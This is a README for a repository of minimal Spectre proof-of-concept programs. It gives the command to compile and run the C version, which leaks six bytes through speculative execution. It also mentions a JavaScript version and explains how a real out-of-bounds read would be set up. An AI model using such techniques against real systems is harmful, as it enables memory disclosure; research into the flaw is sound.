# Minimal Spectre PoCs

## C version

```
$ gcc spectre.c -o spectre
$ ./spectre 16 6
Reading 6 bytes at 16:
offset=16 byte=102 0x66 'f'
offset=17 byte=111 0x6f 'o'
offset=18 byte=111 0x6f 'o'
offset=19 byte=98 0x62 'b'
offset=20 byte=97 0x61 'a'
offset=21 byte=114 0x72 'r'
```
## JavaScript version

Enable `#shared-array-buffer` in `chrome:///flags` under your own risk...

Extracted from: http://xlab.tencent.com/special/spectre/spectre_check.html

Less reliable (no majority vote, less tries) but slightly simplified for my own understanding.

In order to make a real "out-of-bounds" read, `vul_call` should be a native JS array boundary check and the `length` field should be evicted before each test in order to create the window for speculative execution.

## Wasm version?

...
